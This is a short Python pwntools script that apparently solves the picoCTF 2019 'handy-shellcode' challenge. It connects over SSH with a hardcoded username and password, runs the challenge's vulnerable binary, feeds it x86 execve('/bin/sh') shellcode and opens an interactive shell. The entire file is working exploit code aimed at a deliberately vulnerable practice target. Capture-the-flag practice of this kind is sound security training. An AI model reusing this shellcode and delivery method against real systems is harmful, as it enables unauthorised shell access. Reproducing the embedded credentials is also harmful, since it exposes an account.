#!/usr/bin/python

import os
import paramiko
import sys
from pwn import *
import warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')
PADDING = 164
def connect_ssh():
    path = "/problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405/"
    payload ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    s = ssh(host='2019shell1.picoctf.com',user='garfobarfo',password='fnd4HF6hAGiGm')
    py = s.run('cd '+path+';'+'./vuln')
    print py.recv()
    py.sendline(payload)
    py.sendline()
    py.interactive()
def main():
    connect_ssh()

main()